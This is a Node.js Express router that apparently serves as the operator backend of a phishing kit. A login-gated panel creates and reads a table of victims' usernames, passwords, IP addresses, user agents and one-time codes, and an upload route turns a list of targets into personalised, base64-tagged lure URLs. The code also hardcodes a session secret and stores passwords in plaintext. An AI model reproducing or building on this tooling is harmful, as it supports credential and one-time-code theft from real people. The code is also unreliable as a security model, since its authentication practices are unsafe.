const express = require('express');
const router = express.Router()
const db = require('../db');
const dbu =  require('../dbu');
const bodyParser = require('body-parser');
const session = require('express-session');
const fs = require('fs');
const multer = require('multer');

const storage = multer.memoryStorage(); // Store the file in memory
const upload = multer({ storage: storage });



router.use(bodyParser.urlencoded({ extended: true }));
router.use(session({
    secret: 'your-secret-key',
    resave: true,
    saveUninitialized: true
}));



router.get("/", function(req, res,){


  const loginPage = `<!DOCTYPE html>
  <html>
  <head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
  body {font-family: Arial, Helvetica, sans-serif;}
  form {border: 3px solid #f1f1f1;}
  
  input[type=text], input[type=password] {
    width: 100%;
    padding: 12px 20px;
    margin: 8px 0;
    display: inline-block;
    border: 1px solid #ccc;
    box-sizing: border-box;
  }
  
  button {
    background-color: #04AA6D;
    color: white;
    padding: 14px 20px;
    margin: 8px 0;
    border: none;
    cursor: pointer;
    width: 100%;
  }
  
  button:hover {
    opacity: 0.8;
  }
  
  .cancelbtn {
    width: auto;
    padding: 10px 18px;
    background-color: #f44336;
  }
  
  .imgcontainer {
    text-align: center;
    margin: 24px 0 12px 0;
    height:200px;
    width:200px;
  }
  
  img.avatar {
    width: 90%;
    border-radius: 100%;
  }
  
  .container {
      height:200px;
    width:200px;
      padding: 16px;
  }
  
  span.psw {
    float: right;
    padding-top: 16px;
  }
  
  /* Change styles for span and cancel button on extra small screens */
  @media screen and (max-width: 300px) {
    span.psw {
       display: block;
       float: none;
    }
    .cancelbtn {
       width: 100%;
    }
  }
  </style>
  </head>
  <body>
  
  <h2>Login Form</h2>
  <center>
  <form action="/backend/login" method="post">
    <div class="imgcontainer">
      <img src="/images/img_avatar2.png" alt="Avatar" class="avatar">
    </div>
  
    <div class="container">
      <label for="uname"><b>Username</b></label>
      <input type="text" placeholder="Enter Username" name="username" required>
  
      <label for="psw"><b>Password</b></label>
      <input type="password" placeholder="Enter Password" name="password" required>
          
      <button type="submit">Login</button>
     
    </div>
  
   
  </form>
  </center>
  </body>
  </html>`;

if (req.session.loggedin) {
  res.render('index',{ message: '' });
} else {
    res.send(loginPage);
}
});

router.post('/login', (req, res) => {
  const username = req.body.username;
  const password = req.body.password;

  if (username && password) {

 

      dbu.query('SELECT * FROM users WHERE username = ? AND password = ?', [username, password], (error, results, fields) => {
        
          if (results.length > 0) {
              req.session.loggedin = true;
              req.session.username = username;
              res.redirect('/backend');
          } else {
              res.send('Incorrect username or password. Please try again.');
          }
          res.end();
      });
  } else {
      res.send('Please enter username and password.');
      res.end();
  }
});






router.post('/', (req, res) => {
  const { create, delete:newdel, getdata, genurl } = req.body;

if (create) {
      // Handle the "Create Table" button click
      // Your code for creating a table goes here

            const createTableSQL = `
            CREATE TABLE IF NOT EXISTS newtable (
              id INT AUTO_INCREMENT PRIMARY KEY,
              username VARCHAR(255),
              password VARCHAR(255),
              ip VARCHAR(255) NOT NULL,
              useragent VARCHAR(255) NOT NULL,
              date TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
              pagetype VARCHAR(255),
              code VARCHAR(255),
              code2 VARCHAR(255),
              notify VARCHAR(20) DEFAULT 0
            )
            `;
                
                db.query(createTableSQL, (err, result) => {
            if (err) {
                console.error('Error creating table:', err);
            } else {
                console.log('Table created successfully');
            }
      
    });
      
    res.render('index', { message: 'Table Created' }); 
  
  } else if (newdel) {
    const tableName = 'newtable'; // Replace with the name of the table to delete

    // SQL query to delete the table
    const deleteQuery = `DROP TABLE ${tableName}`;
  
    // Execute the query to delete the table
    db.query(deleteQuery, (err, result) => {
        if (err) {
            console.error('Error deleting table:', err);
            return res.status(500).send('Internal Server Error');
        }
        res.render('index', { message: 'Table Deleted' }); 
    });
  } else if (getdata) {
      // Handle the "Get Data" button click
      // Your code for retrieving data goes here
      const query = 'SELECT * FROM newtable'; // Replace with your table name
  
    db.query(query, (err, results) => {
      if (err) {
        console.error('Error executing the query: ' + err.stack);
        return res.status(500).send('Error fetching data from the database.');
      }

      if (results.length === 0) {
        // Handle the case when no rows were returned
        return res.render('index', { message: 'No Entry In The Table' }); 
      }
   // Store the data in a variable
      const data = Object.values(JSON.parse(JSON.stringify(results)));
     
      res.render('table', {data});
  
    });

  } else if (genurl) {

    res.render('newurl');

  } else {
      // Handle any other case
      res.send('Unknown action');
  }
  
  
  
  
  
});


router.post('/upload', upload.single('textFile'), (req, res) => {
  // Access the uploaded file from req.file
  const url = req.body.url;
  const key = req.body.key;
  const uploadedFile = req.file;

  // Check if a file was uploaded
  if (!uploadedFile) {
      return res.status(400).send('No file uploaded.');
  }

  // Ensure the uploaded file is a text/plain file
  if (uploadedFile.mimetype !== 'text/plain') {
      return res.status(400).send('Only text files are allowed.');
  }

  // Read the content of the uploaded text file
  const fileContent = uploadedFile.buffer.toString('utf-8');
  const line = fileContent.split('\n');
  const b64user = line.map((str) => Buffer.from(str).toString('base64'));
  const links = b64user.map((str) => `${url}${key}${str}`);  
  res.render('url', { title:'USER LIST WITH URL', line, links });

  
  // Display the content in the response or perform other actions
  
  
});




module.exports = router;
